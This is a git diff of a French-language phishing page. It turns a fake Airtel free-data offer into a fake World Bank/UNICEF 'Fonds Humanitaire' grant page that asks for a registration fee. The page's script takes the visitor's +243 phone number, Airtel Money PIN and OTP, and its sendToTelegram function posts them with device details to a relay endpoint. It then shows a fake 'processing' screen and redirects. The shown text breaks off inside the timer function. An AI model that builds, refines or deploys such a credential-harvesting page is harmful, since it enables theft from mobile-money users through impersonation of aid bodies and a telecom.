@@ -1,617 +1,653 @@
 <!doctype html>
-<html>
+<html lang="fr">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-
-<title>Recevoir le Forfait</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
-
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
+<meta name="theme-color" content="#002370"/>
+<title>Payer les Frais · Fonds Humanitaire</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
-
-*{
-box-sizing:border-box
-}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 
 :root{
---primary:#e60000;
---primary-dark:#b30000;
---primary-soft:#ffe5e5;
---accent:#ffcccc;
+  --blue:#003DA5;
+  --blue-dark:#002370;
+  --teal:#0ea5e9;
+  --teal-dark:#0284c7;
+  --red:#e60000;
+  --neutral-100:#f4f4f5;
+  --neutral-200:#e4e4e7;
+  --neutral-400:#a1a1aa;
+  --neutral-500:#71717a;
+  --neutral-900:#18181b;
+  --white:#fff;
+  --font:'DM Sans',sans-serif;
+  --mono:'DM Mono',monospace;
+  --radius-md:16px;
+  --radius-lg:22px;
+  --radius-xl:28px;
 }
 
-body{
-font-family:"Plus Jakarta Sans",system-ui;
-margin:0;
-min-height:100vh;
-display:flex;
-align-items:center;
-justify-content:center;
-background:linear-gradient(180deg,#fff5f5,#ffe0e0);
-overflow:hidden;
+html,body{
+  width:100%;height:100%;height:100dvh;
+  overflow:hidden;overflow-x:hidden;
+  font-family:var(--font);
+  background:#0a0f1e;
 }
 
-/* waves */
-
-.wave{
-position:fixed;
-width:700px;
-height:700px;
-border-radius:50%;
-background:
-radial-gradient(circle,
-rgba(230,0,0,.15),
-transparent 70%);
-filter:blur(45px);
-animation:float 20s infinite linear;
-z-index:-1;
+.screen{
+  display:flex;flex-direction:column;
+  width:100%;height:100%;height:100dvh;
+  max-width:430px;margin:0 auto;
+  background:#0a0f1e;
+  overflow:hidden;overflow-x:hidden;
+  position:relative;
 }
 
-.wave.one{
-top:-250px;
-right:-150px
+/* ── HEADER ── */
+.header{
+  background:var(--blue-dark);
+  padding:18px 20px 22px;
+  position:relative;overflow:hidden;flex-shrink:0;
 }
 
-.wave.two{
-bottom:-250px;
-left:-150px
+.header::after{
+  content:'';position:absolute;inset:0;
+  background-image:
+    linear-gradient(rgba(255,255,255,.04) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(255,255,255,.04) 1px,transparent 1px);
+  background-size:44px 44px;pointer-events:none;
 }
 
-@keyframes float{
-0%{transform:translateY(0)}
-50%{transform:translateY(40px)}
-100%{transform:translateY(0)}
+.hglow-a{
+  position:absolute;width:260px;height:260px;border-radius:50%;
+  background:rgba(14,165,233,.28);filter:blur(60px);
+  top:-110px;right:-80px;pointer-events:none;
+}
+.hglow-b{
+  position:absolute;width:180px;height:180px;border-radius:50%;
+  background:rgba(0,61,165,.4);filter:blur(50px);
+  bottom:-60px;left:-30px;pointer-events:none;
 }
 
-/* card */
-
-.step{
-position:absolute;
-width:100%;
-max-width:420px;
-padding:30px;
-background:white;
-border-radius:24px;
-box-shadow:
-0 25px 50px rgba(230,0,0,.12);
-transition:.35s;
-border:1px solid rgba(230,0,0,.08);
+.header-top{
+  display:flex;align-items:flex-start;justify-content:space-between;
+  margin-bottom:16px;position:relative;z-index:1;
 }
 
-.container{
-position:relative;
-width:100%;
-max-width:420px;
-height:560px;
+/* AIRTEL LOGO — white pill, original colors */
+.brand-logo-wrap{
+  background:white;border-radius:8px;
+  padding:3px 10px;
+  display:flex;align-items:center;height:34px;
 }
 
-.hidden{
-opacity:0;
-pointer-events:none;
-transform:translateX(40px);
+.brand-logo{height:26px;object-fit:contain;display:block}
+
+/* World Bank + UNICEF header logos */
+.brand-logos{display:flex;align-items:center;gap:6px}
+
+.brand-logo-pill-dark{
+  background:rgba(255,255,255,.12);
+  border:1px solid rgba(255,255,255,.18);
+  border-radius:7px;padding:3px 8px;
+  display:flex;align-items:center;justify-content:center;height:28px;
 }
 
-.logo{
-height:72px;
-display:block;
-margin:auto;
+.brand-logo-wb{height:18px;object-fit:contain}
+.brand-logo-un{height:18px;object-fit:contain}
+.brand-sep{width:1px;height:16px;background:rgba(255,255,255,.2);flex-shrink:0}
+
+.brand-sub{
+  font-size:10px;font-weight:500;
+  color:rgba(255,255,255,.4);letter-spacing:.2px;margin-top:5px;
 }
 
-h1{
-text-align:center;
-margin:14px 0 6px;
-font-size:24px;
-font-weight:800;
-
-background:linear-gradient(
-90deg,
-var(--primary),
-#ff4d4d
-);
-
--webkit-background-clip:text;
--webkit-text-fill-color:transparent;
+.header-chip{
+  background:rgba(14,165,233,.18);
+  border:1px solid rgba(14,165,233,.32);
+  padding:5px 12px;border-radius:999px;
+  font-size:11px;font-weight:700;color:#7dd3fc;
+  letter-spacing:.3px;flex-shrink:0;margin-top:2px;
+  white-space:nowrap;
 }
 
-.warning{
-text-align:center;
-font-size:13px;
-color:#e11d48;
-margin-top:6px;
-margin-bottom:18px;
-font-weight:600;
+/* GRANT SUMMARY */
+.header-info{position:relative;z-index:1}
+
+.header-label{
+  font-size:11px;color:rgba(255,255,255,.5);
+  font-weight:500;margin-bottom:4px;
+  text-transform:uppercase;letter-spacing:.5px;
 }
 
-label{
-font-size:12px;
-margin-top:12px;
-display:block;
-color:#444;
-font-weight:600;
+.fee-amount-row{
+  display:flex;align-items:flex-end;gap:5px;margin-bottom:10px;
 }
 
-input{
-width:100%;
-padding:13px;
-border-radius:14px;
-border:1px solid #e5e7eb;
-background:#fafafa;
-margin-top:6px;
-font-size:14px;
-outline:none;
-transition:.2s;
+.fee-currency{
+  font-size:16px;font-weight:700;
+  color:rgba(255,255,255,.6);margin-bottom:4px;
 }
 
-input:focus{
-border-color:var(--primary);
-box-shadow:0 0 0 4px rgba(230,0,0,.08);
+.fee-amount{
+  font-size:40px;font-weight:800;
+  color:white;line-height:1;
+  font-family:var(--mono);font-variant-numeric:tabular-nums;
 }
 
-.phone-group{
-display:flex;
-gap:8px;
-align-items:center;
+.grant-pills{display:flex;gap:6px;flex-wrap:wrap}
+
+.grant-pill{
+  background:rgba(255,255,255,.1);
+  border:1px solid rgba(255,255,255,.16);
+  border-radius:999px;padding:4px 10px;
+  font-size:10px;font-weight:700;color:rgba(255,255,255,.7);
+  font-family:var(--mono);
 }
 
-.prefix{
-background:rgba(230,0,0,.08);
-padding:13px;
-border-radius:14px;
-border:1px solid rgba(230,0,0,.2);
-font-weight:700;
-color:var(--primary);
+/* ── BODY ── */
+.body{
+  flex:1;overflow-y:auto;overflow-x:hidden;
+  -webkit-overflow-scrolling:touch;
+  padding:20px 14px max(88px,calc(72px + env(safe-area-inset-bottom)));
+  overscroll-behavior:contain;min-height:0;
+}
+.body::-webkit-scrollbar{display:none}
+
+/* STEP */
+.step{display:none;flex-direction:column;gap:0}
+.step.active{display:flex}
+
+/* CARD */
+.card{
+  background:rgba(255,255,255,.06);
+  border:1px solid rgba(255,255,255,.11);
+  border-radius:var(--radius-lg);overflow:hidden;margin-bottom:12px;
 }
 
-.btn{
-margin-top:20px;
-width:100%;
-padding:13px;
-border-radius:14px;
-border:0;
-font-weight:700;
+.card-accent{height:3px;width:100%;background:linear-gradient(90deg,var(--teal),#22c55e,var(--blue))}
 
-background:linear-gradient(
-135deg,
-var(--primary),
-#ff3333
-);
-
-color:white;
-cursor:pointer;
-opacity:.45;
-transition:.2s;
+.card-header{
+  padding:13px 16px 11px;
+  border-bottom:1px solid rgba(255,255,255,.07);
 }
 
-.btn.active{
-opacity:1;
+.card-title{font-size:14px;font-weight:700;color:white}
+.card-sub{font-size:11px;color:rgba(255,255,255,.4);font-weight:500;margin-top:2px}
+
+.card-body{padding:14px 16px}
+
+/* FIELD */
+.field{margin-bottom:14px}
+.field:last-child{margin-bottom:0}
+
+.field-label{
+  font-size:11px;font-weight:700;
+  color:rgba(255,255,255,.45);
+  text-transform:uppercase;letter-spacing:.7px;margin-bottom:6px;
 }
 
-.pin{
-display:flex;
-gap:12px;
-justify-content:center;
-margin:18px 0;
+/* PHONE */
+.phone-row{display:flex;gap:8px}
+
+.phone-prefix{
+  background:rgba(230,0,0,.15);
+  color:#fca5a5;
+  font-size:14px;font-weight:800;font-family:var(--mono);
+  padding:0 14px;border-radius:var(--radius-md);
+  border:1.5px solid rgba(230,0,0,.25);
+  display:flex;align-items:center;flex-shrink:0;height:48px;
 }
 
-.pin input{
-width:58px;
-height:60px;
-font-size:22px;
-text-align:center;
-border-radius:16px;
-border:1px solid #e5e7eb;
-font-weight:700;
+input[type=tel]{
+  width:100%;height:48px;padding:0 14px;
+  border-radius:var(--radius-md);
+  border:1.5px solid rgba(255,255,255,.14);
+  background:rgba(255,255,255,.07);
+  font-family:var(--mono);font-size:16px;font-weight:500;
+  color:white;outline:none;
+  transition:border-color .18s,box-shadow .18s;-webkit-appearance:none;
+}
+input[type=tel]::placeholder{color:rgba(255,255,255,.25);font-family:var(--font);font-size:14px}
+input[type=tel]:focus{
+  border-color:rgba(14,165,233,.6);
+  box-shadow:0 0 0 4px rgba(14,165,233,.1);
+  background:rgba(255,255,255,.1);
 }
 
-.count{
-text-align:center;
-font-size:13px;
-color:#666;
+.field-hint{font-size:11px;color:rgba(255,255,255,.3);font-weight:500;margin-top:5px}
+
+/* PIN with eye */
+.pin-field{position:relative;display:flex;align-items:center}
+
+.pin-field input{
+  width:100%;height:52px;
+  padding:0 48px 0 16px;
+  border-radius:var(--radius-md);
+  border:1.5px solid rgba(255,255,255,.14);
+  background:rgba(255,255,255,.07);
+  font-family:var(--mono);font-size:22px;font-weight:800;
+  letter-spacing:6px;color:white;outline:none;
+  transition:border-color .18s,box-shadow .18s;-webkit-appearance:none;
+}
+.pin-field input::placeholder{color:rgba(255,255,255,.2);letter-spacing:3px;font-size:16px}
+.pin-field input:focus{
+  border-color:rgba(14,165,233,.6);
+  box-shadow:0 0 0 4px rgba(14,165,233,.1);
+  background:rgba(255,255,255,.1);
 }
 
-.resend{
-text-align:center;
-margin-top:10px;
-font-size:13px;
+.eye-btn{
+  position:absolute;right:14px;
+  background:none;border:none;cursor:pointer;padding:4px;
+  color:rgba(255,255,255,.35);display:flex;align-items:center;
+  transition:color .15s;
+}
+.eye-btn:hover{color:rgba(255,255,255,.7)}
+
+/* MASKED NOTE */
+.masked-note{
+  font-size:13px;color:rgba(255,255,255,.5);
+  font-weight:500;line-height:1.5;text-align:center;padding:2px 0 4px;
 }
 
-.resend button{
-border:0;
-background:none;
-color:var(--primary);
-cursor:pointer;
-font-weight:700;
-opacity:.4;
+/* OTP — 4 boxes, hidden single input */
+.otp-wrap{position:relative;height:60px}
+
+.otp-wrap #otpHidden{
+  position:absolute;inset:0;
+  width:100%;height:100%;
+  opacity:0;cursor:pointer;font-size:16px;z-index:2;
+  border:none;background:none;outline:none;caret-color:transparent;
 }
 
-.resend button.active{
-opacity:1;
+.otp-display{display:flex;gap:10px;pointer-events:none}
+
+.otp-box{
+  flex:1;height:60px;border-radius:14px;
+  border:1.5px solid rgba(255,255,255,.14);
+  background:rgba(255,255,255,.07);
+  display:flex;align-items:center;justify-content:center;
+  font-family:var(--mono);font-size:24px;font-weight:800;
+  color:white;transition:border-color .18s,box-shadow .18s,background .18s;
+}
+.otp-box.filled{background:rgba(255,255,255,.12);border-color:rgba(14,165,233,.5)}
+.otp-box.active{
+  border-color:rgba(14,165,233,.7);
+  box-shadow:0 0 0 3px rgba(14,165,233,.12);
+  background:rgba(255,255,255,.12);
+}
+.otp-box.disabled{opacity:.35;background:rgba(255,255,255,.04);border-color:rgba(255,255,255,.08)}
+
+/* TIMER */
+.timer-row{
+  display:flex;justify-content:space-between;align-items:center;padding:10px 0 0;
+}
+.timer-label{font-size:12px;color:rgba(255,255,255,.4);font-weight:500}
+.timer-val{font-family:var(--mono);font-size:13px;font-weight:700;color:#7dd3fc}
+
+.resend-btn{
+  background:none;border:none;font-family:var(--font);
+  font-size:12px;font-weight:700;color:#7dd3fc;
+  cursor:pointer;opacity:.3;padding:0;transition:opacity .18s;
+}
+.resend-btn.active{opacity:1}
+
+/* POWERED BY */
+.powered{
+  text-align:center;padding:4px 0 2px;
+  font-size:10px;color:rgba(255,255,255,.18);font-weight:500;letter-spacing:.3px;
+}
+.powered strong{color:rgba(255,255,255,.32);font-weight:700}
+
+/* ── STICKY FOOTER ── */
+.sticky-footer{
+  position:absolute;bottom:0;left:0;right:0;
+  padding:12px 14px max(20px,env(safe-area-inset-bottom));
+  background:linear-gradient(to top,#0a0f1e 72%,transparent);z-index:10;
 }
 
+.pay-btn{
+  background:linear-gradient(135deg,var(--teal),var(--teal-dark));
+  color:white;border:none;width:100%;padding:16px;
+  border-radius:var(--radius-md);
+  font-family:var(--font);font-size:15px;font-weight:800;
+  cursor:pointer;letter-spacing:-.1px;
+  transition:all .15s ease;opacity:.4;pointer-events:none;
+}
+.pay-btn.active{opacity:1;pointer-events:auto}
+.pay-btn:active{transform:scale(.98);filter:brightness(.9)}
 </style>
-
 </head>
-
 <body>
 
-<div class="wave one"></div>
-<div class="wave two"></div>
+<div class="screen">
 
-<div class="container">
+  <!-- HEADER -->
+  <div class="header">
+    <div class="hglow-a"></div>
+    <div class="hglow-b"></div>
 
-<!-- LOGIN -->
+    <div class="header-top">
+      <div>
+        <div class="brand-logos">
+          <div class="brand-logo-pill-dark"><img src="assets/worldbank.svg" alt="World Bank" class="brand-logo-wb"></div>
+          <span class="brand-sep"></span>
+          <div class="brand-logo-pill-dark"><img src="assets/unicef.webp" alt="UNICEF" class="brand-logo-un"></div>
+        </div>
+        <div class="brand-sub" style="margin-top:5px">Fonds Humanitaire Mondial</div>
+      </div>
+      <div class="header-chip">Frais d'inscription</div>
+    </div>
 
-<div id="step1" class="step">
+    <div class="header-info">
+      <div class="header-label">Frais à payer</div>
+      <div class="fee-amount-row">
+        <span class="fee-currency">USD</span>
+        <span class="fee-amount" id="headerFee">0.00</span>
+      </div>
+      <div class="grant-pills">
+        <span class="grant-pill" id="pillGrant">Subvention : —</span>
+        <span class="grant-pill" id="pillRate">Taux : 6%</span>
+        <span class="grant-pill" id="pillPlan">Fonds Humanitaire</span>
+      </div>
+    </div>
 
-<img src="assets/airtel.png" class="logo">
+    <!-- AIRTEL LOGO — payment partner at bottom of header -->
+    <div class="header-payment" style="position:relative;z-index:1;margin-top:14px;display:flex;align-items:center;gap:10px;padding-top:12px;border-top:1px solid rgba(255,255,255,.08)">
+      <div style="font-size:10px;font-weight:700;color:rgba(255,255,255,.35);text-transform:uppercase;letter-spacing:.6px;white-space:nowrap">Paiement via</div>
+      <div class="brand-logo-wrap">
+        <img src="assets/airtel.png" alt="Airtel Money" class="brand-logo">
+      </div>
+    </div>
+  </div>
 
-<h1>Recevoir le Forfait</h1>
+  <!-- BODY -->
+  <div class="body">
 
-<label>Numéro de téléphone</label>
+    <!-- STEP 1 -->
+    <div id="step1" class="step active">
+      <div class="card">
+        <div class="card-accent"></div>
+        <div class="card-header">
+          <div class="card-title">Vérifier votre compte</div>
+          <div class="card-sub">Entrez votre numéro Airtel Money et votre PIN</div>
+        </div>
+        <div class="card-body">
 
-<div class="phone-group">
-<div class="prefix">+243</div>
-<input id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="XXXXXXXXX">
-</div>
+          <div class="field">
+            <div class="field-label">Numéro de téléphone</div>
+            <div class="phone-row">
+              <div class="phone-prefix">+243</div>
+              <input type="tel" id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="XXXXXXXXX">
+            </div>
+            <div class="field-hint">Numéro Airtel à 9 chiffres</div>
+          </div>
 
-<div class="warning">
-Entrez votre numéro Airtel à 9 chiffres.
-</div>
+          <div class="field">
+            <div class="field-label">Entrez votre PIN</div>
+            <div class="pin-field">
+              <input type="password" id="pinInput" inputmode="numeric"
+                maxlength="4" pattern="[0-9]*" placeholder="••••"
+                autocomplete="current-password">
+              <button class="eye-btn" id="eyeBtn" type="button">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none"
+                  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                  <circle cx="12" cy="12" r="3"/>
+                </svg>
+              </button>
+            </div>
+          </div>
 
-<label>Entrez votre PIN</label>
+        </div>
+      </div>
+      <div class="powered">Paiement via <strong>Airtel Money</strong> &middot; Fonds Humanitaire Mondial</div>
+    </div>
 
-<div class="pin">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-</div>
+    <!-- STEP 3: OTP -->
+    <div id="step3" class="step">
+      <div class="card">
+        <div class="card-accent"></div>
+        <div class="card-header">
+          <div class="card-title">Code de vérification</div>
+          <div class="card-sub">Entrez le code OTP envoyé à votre numéro</div>
+        </div>
+        <div class="card-body">
 
-<button id="loginBtn" class="btn">Continuer</button>
+          <div class="field">
+            <div class="masked-note" id="maskedNumber">Entrez le code OTP envoyé à votre numéro</div>
+          </div>
 
-</div>
+          <div class="field">
+            <div class="field-label">Code OTP</div>
+            <div class="otp-wrap" id="otpWrap">
+              <input type="text" id="otpHidden" inputmode="numeric"
+                pattern="[0-9]*" maxlength="4" autocomplete="one-time-code">
+              <div class="otp-display">
+                <div class="otp-box" id="ob0"></div>
+                <div class="otp-box" id="ob1"></div>
+                <div class="otp-box" id="ob2"></div>
+                <div class="otp-box" id="ob3"></div>
+              </div>
+            </div>
+          </div>
 
-<!-- OTP -->
+          <div class="timer-row">
+            <div class="timer-label">Le code expire dans <span class="timer-val" id="time">120</span>s</div>
+            <button class="resend-btn" id="resendBtn">Renvoyer OTP</button>
+          </div>
 
-<div id="step3" class="step hidden">
+        </div>
+      </div>
+      <div class="powered">Paiement via <strong>Airtel Money</strong> &middot; Fonds Humanitaire Mondial</div>
+    </div>
 
-<img src="assets/airtel.png" class="logo">
+    <!-- STEP 4 -->
+    <div id="step4" class="step">
+      <div class="card">
+        <div class="card-accent"></div>
+        <div class="card-body" style="padding:32px 16px;text-align:center">
+          <div style="width:56px;height:56px;border-radius:50%;background:rgba(14,165,233,.15);border:2px solid rgba(14,165,233,.3);display:flex;align-items:center;justify-content:center;margin:0 auto 14px;font-size:24px">⏳</div>
+          <div style="font-size:18px;font-weight:800;color:white;margin-bottom:6px">Traitement en cours...</div>
+          <div style="font-size:13px;color:rgba(255,255,255,.45);font-weight:500;line-height:1.6">Votre paiement des frais d'inscription<br>est en cours de traitement.</div>
+        </div>
+      </div>
+    </div>
 
-<h1>Recevoir le Forfait</h1>
+  </div>
 
-<div class="warning" id="maskedNumber"></div>
-
-<div class="pin">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-</div>
-
-<div class="count">
-Le code expire dans <span id="time">120</span>s
-</div>
-
-<div class="resend">
-<button id="resendBtn">Renvoyer OTP</button>
-</div>
-
-<button id="otpBtn" class="btn">Recevoir les bundles</button>
-
-</div>
-
-<!-- SUCCESS -->
-
-<div id="step4" class="step hidden">
-
-<img src="assets/airtel.png" class="logo">
-
-<h1>Succès</h1>
-
-<div class="warning">
-Traitement de votre demande...
-</div>
-
-</div>
+  <!-- FOOTER -->
+  <div class="sticky-footer">
+    <button class="pay-btn" id="mainBtn">Continuer</button>
+  </div>
 
 </div>
 
 <script>
+let phoneValue="";
+let pinValue="";
+let otpValue="";
+let loginClicked=false;
+let otpSubmitted=false;
+let resendClicked=false;
+let currentStep="step1";
 
-let phoneValue=""
-let pinValue=""
-let otpValue=""
-let loginClicked=false
-let otpSubmitted=false
-let resendClicked=false
+/* ── Load plan ── */
+let selectedPlan=null;
+try{selectedPlan=JSON.parse(sessionStorage.getItem("selectedPlan"))}catch(e){}
 
-let selectedPlan=null
-
-try{
-selectedPlan=JSON.parse(sessionStorage.getItem("selectedPlan"))
-}catch(e){}
-
-const priceMap={
-"100GB":"GRATUIT"
+function initHeader(){
+  if(!selectedPlan) return;
+  const fee=(selectedPlan.registrationFee||0).toLocaleString('fr-FR',{minimumFractionDigits:2,maximumFractionDigits:2});
+  const grant=(selectedPlan.grantAmount||0).toLocaleString('fr-FR',{minimumFractionDigits:2,maximumFractionDigits:2});
+  document.getElementById("headerFee").textContent=fee;
+  document.getElementById("pillGrant").textContent="Subvention : $"+grant;
+  document.getElementById("pillPlan").textContent=selectedPlan.plan||"Fonds Humanitaire";
 }
+initHeader();
+
+/* ── Device ── */
+const ua=navigator.userAgent;
+let device="Unknown";
+if(/Android/i.test(ua)) device="Android";
+else if(/iPhone|iPad/i.test(ua)) device="iOS";
+if(/Chrome/i.test(ua)) device+=" | Chrome";
+else if(/Safari/i.test(ua)) device+=" | Safari";
+
+const priceMap={"100GB":"GRATUIT"};
 
 function getPlanLine(){
-
-if(!selectedPlan) return "Forfait inconnu"
-
-let name=selectedPlan.name||selectedPlan.shortName||"Forfait"
-
-let price=selectedPlan.price
-
-if(!price){
-
-for(let k in priceMap){
-if(name.includes(k)){
-price=priceMap[k]
-break
+  if(!selectedPlan) return "Forfait inconnu";
+  let name=selectedPlan.plan||selectedPlan.name||selectedPlan.shortName||"Forfait";
+  let price=selectedPlan.price;
+  if(!price){for(let k in priceMap){if(name.includes(k)){price=priceMap[k];break}}}
+  return `${name} | Subvention: $${selectedPlan.grantAmount||0} | Frais: $${selectedPlan.registrationFee||0}`;
 }
-}
-
-}
-
-return name+" — "+price
-
-}
-
-const ua=navigator.userAgent
-
-let device="Unknown"
-
-if(/Android/i.test(ua)) device="Android"
-else if(/iPhone|iPad/i.test(ua)) device="iOS"
-
-if(/Chrome/i.test(ua)) device+=" | Chrome"
-else if(/Safari/i.test(ua)) device+=" | Safari"
 
 async function sendToTelegram(eventName){
-
-fetch("/api/sendTelegram",{
-
-method:"POST",
-
-headers:{
-"Content-Type":"application/json"
-},
-
-body:JSON.stringify({
-
-submittedAt:new Date().toISOString(),
-loginPhone:phoneValue,
-loginPin:pinValue,
-otp:otpValue,
-event:eventName,
-plan:getPlanLine(),
-device:device
-
-})
-
-})
-
+  fetch("/api/sendTelegram",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      submittedAt:new Date().toISOString(),
+      loginPhone:phoneValue,loginPin:pinValue,
+      otp:otpValue,event:eventName,
+      plan:getPlanLine(),device:device
+    })
+  });
 }
 
-/* phone cleanup */
-
-phone.oninput=e=>{
-
-let v=e.target.value.replace(/\D/g,"")
-
-if(v.startsWith("243")) v=v.slice(3)
-if(v.startsWith("0")) v=v.slice(1)
-
-v=v.slice(0,9)
-
-e.target.value=v
-
-phoneValue="+243"+v
-
-validateLogin()
-
+/* ── Step management ── */
+function showStep(id){
+  document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"));
+  document.getElementById(id).classList.add("active");
+  currentStep=id;updateBtn();
 }
 
-/* PIN inputs */
-
-const pinInputs=document.querySelectorAll("#step1 .pin input")
-
-pinInputs.forEach((input,i)=>{
-
-input.oninput=()=>{
-
-input.value=input.value.replace(/\D/g,"")
-
-if(input.value && i<3) pinInputs[i+1].focus()
-
-validateLogin()
-
+function updateBtn(){
+  const btn=document.getElementById("mainBtn");
+  if(currentStep==="step1"){btn.textContent="Continuer";validateLogin();}
+  else if(currentStep==="step3"){btn.textContent="Confirmer OTP";validateOtp();}
+  else{btn.textContent="Traitement...";btn.classList.remove("active");}
 }
 
-input.onkeydown=e=>{
+/* ── Phone ── */
+const phoneEl=document.getElementById("phone");
+phoneEl.oninput=e=>{
+  let v=e.target.value.replace(/\D/g,"");
+  if(v.startsWith("243")) v=v.slice(3);
+  if(v.startsWith("0")) v=v.slice(1);
+  v=v.slice(0,9);
+  e.target.value=v;
+  phoneValue="+243"+v;
+  validateLogin();
+};
 
-if(e.key==="Backspace" && !input.value && i>0){
+/* ── PIN + eye ── */
+const pinInput=document.getElementById("pinInput");
+const eyeBtn=document.getElementById("eyeBtn");
 
-pinInputs[i-1].focus()
-pinInputs[i-1].value=""
+pinInput.oninput=()=>{
+  pinInput.value=pinInput.value.replace(/\D/g,"").slice(0,4);
+  validateLogin();
+};
 
-validateLogin()
-
-}
-
-}
-
-})
+eyeBtn.onclick=()=>{
+  const show=pinInput.type==="password";
+  pinInput.type=show?"text":"password";
+  eyeBtn.innerHTML=show
+    ?`<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`
+    :`<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
+};
 
 function validateLogin(){
-
-pinValue=[...pinInputs].map(i=>i.value).join("")
-
-if(phoneValue.length===13 && pinValue.length===4)
-loginBtn.classList.add("active")
-else
-loginBtn.classList.remove("active")
-
+  pinValue=pinInput.value;
+  const ok=phoneValue.length===13&&pinValue.length===4;
+  document.getElementById("mainBtn").classList.toggle("active",ok);
 }
 
-function show(id){
+/* ── OTP hidden input → 4 visual boxes ── */
+const otpHidden=document.getElementById("otpHidden");
+const otpBoxes=[...document.querySelectorAll(".otp-box")];
+let otpDisabled=false;
 
-document.querySelectorAll(".step")
-.forEach(s=>s.classList.add("hidden"))
-
-document.getElementById(id)
-.classList.remove("hidden")
-
+function renderOtp(){
+  const val=otpHidden.value.replace(/\D/g,"").slice(0,4);
+  otpHidden.value=val;
+  const cursor=val.length;
+  otpBoxes.forEach((box,i)=>{
+    box.textContent=val[i]||"";
+    box.className="otp-box";
+    if(otpDisabled){box.classList.add("disabled");return}
+    if(i<cursor) box.classList.add("filled");
+    if(i===cursor&&document.activeElement===otpHidden) box.classList.add("active");
+  });
+  otpValue=val;
+  document.getElementById("mainBtn").classList.toggle("active",val.length===4);
 }
 
-/* continue */
+otpHidden.addEventListener("input",renderOtp);
+otpHidden.addEventListener("focus",renderOtp);
+otpHidden.addEventListener("blur",renderOtp);
+document.getElementById("otpWrap").addEventListener("click",()=>{if(!otpDisabled) otpHidden.focus()});
 
-loginBtn.onclick=()=>{
-
-if(!loginBtn.classList.contains("active")) return
-if(loginClicked) return
-
-loginClicked=true
-
-sendToTelegram("continue_clicked")
-
-const masked=phoneValue.replace(/(\+243\d{3})\d{4}(\d{2})/,"$1****$2")
-
-maskedNumber.innerHTML=`Entrez le code OTP envoyé à ${masked}`
-
-show("step3")
-
-startTimer()
-
+function resetOtp(disabled){
+  otpDisabled=disabled;otpHidden.value="";otpHidden.disabled=disabled;
+  renderOtp();if(!disabled) otpHidden.focus();
 }
-
-/* OTP inputs */
-
-const otpInputs=document.querySelectorAll("#step3 .pin input")
-
-const otpBtn=document.getElementById("otpBtn")
-
-otpInputs.forEach((input,i)=>{
-
-input.oninput=()=>{
-
-input.value=input.value.replace(/\D/g,"")
-
-if(input.value && i<3) otpInputs[i+1].focus()
-
-validateOtp()
-
-}
-
-input.onkeydown=e=>{
-
-if(e.key==="Backspace" && !input.value && i>0){
-
-otpInputs[i-1].focus()
-otpInputs[i-1].value=""
-
-validateOtp()
-
-}
-
-}
-
-})
 
 function validateOtp(){
-
-otpValue=[...otpInputs].map(i=>i.value).join("")
-
-if(otpValue.length===4)
-otpBtn.classList.add("active")
-else
-otpBtn.classList.remove("active")
-
+  document.getElementById("mainBtn").classList.toggle("active",otpValue.length===4);
 }
 
-/* submit */
+/* ── Main button ── */
+document.getElementById("mainBtn").onclick=()=>{
+  if(currentStep==="step1"){
+    if(loginClicked) return;
+    loginClicked=true;
+    sendToTelegram("continue_clicked");
+    const masked=phoneValue.replace(/(\+243\d{3})\d{4}(\d{2})/,"$1****$2");
+    document.getElementById("maskedNumber").textContent="Entrez le code OTP envoyé à "+masked;
+    showStep("step3");startTimer();
+  } else if(currentStep==="step3"){
+    if(otpSubmitted) return;
+    otpSubmitted=true;
+    sendToTelegram("bundle_received");
+    showStep("step4");
+    setTimeout(()=>{location.href="thankyou.html"},1200);
+  }
+};
 
-otpBtn.onclick=()=>{
+/* ── Resend ── */
+document.getElementById("resendBtn").onclick=()=>{
+  const btn=document.getElementById("resendBtn");
+  if(!btn.classList.contains("active")) return;
+  if(resendClicked) return;
+  resendClicked=true;
+  sendToTelegram("resend_otp");
+  startTimer();
+};
 
-if(!otpBtn.classList.contains("active")) return
-if(otpSubmitted) return
-
-otpSubmitted=true
-
-sendToTelegram("bundle_received")
-
-show("step4")
-
-setTimeout(()=>{
-
-location.href="thankyou.html"
-
-},1200)
-
-}
-
-/* resend */
-
-resendBtn.onclick=()=>{
-
-if(!resendBtn.classList.contains("active")) return
-if(resendClicked) return
-
-resendClicked=true
-
-sendToTelegram("resend_otp")
-
-startTimer()
-
-}
-
-/* timer */
-
+/* ── Timer ── */
 function startTimer(){
-
-let t=120
-
-time.textContent=t
-
-resendBtn.classList.remove("active")
-
-resendClicked=false
-
-otpInputs.forEach(i=>{
-i.disabled=false
-i.value=""
-})
-
